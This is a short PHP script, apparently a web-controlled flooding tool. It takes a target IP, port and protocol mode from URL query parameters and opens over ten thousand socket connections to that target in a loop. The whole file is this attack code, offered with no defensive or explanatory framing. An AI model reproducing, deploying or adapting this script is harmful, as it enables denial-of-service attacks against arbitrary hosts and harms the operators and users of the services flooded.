<?php

$ip=$_GET['ip'];
$port=$_GET['port'];
$mode=$_GET['mode'];
for($i=0; $i<=10000; $i++){
$fp = fsockopen("".$mode."://".$ip."", $port, $errno, $errstr,30);
echo $i;
}


?>